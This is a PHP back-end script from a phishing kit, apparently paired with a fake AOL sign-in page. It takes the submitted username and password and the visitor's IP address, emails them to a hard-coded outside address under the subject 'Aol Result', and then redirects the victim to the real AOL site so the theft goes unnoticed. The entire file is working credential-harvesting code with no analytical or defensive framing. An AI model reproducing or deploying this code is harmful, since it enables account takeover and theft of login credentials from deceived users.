<?php

$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Aol Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$a = "index4.php?email=".$_POST['user'];
mail($recipient,$ip,$message);

$recipient = "fehahe4397@jo6s.com";
$subject = "Result!!!";
$headers = "From: office<fehahe4397@jo6s.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$ip,$message,$headers)) {

?>
	
		   <script language=javascript>
window.location="https://www.aol.com/";
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>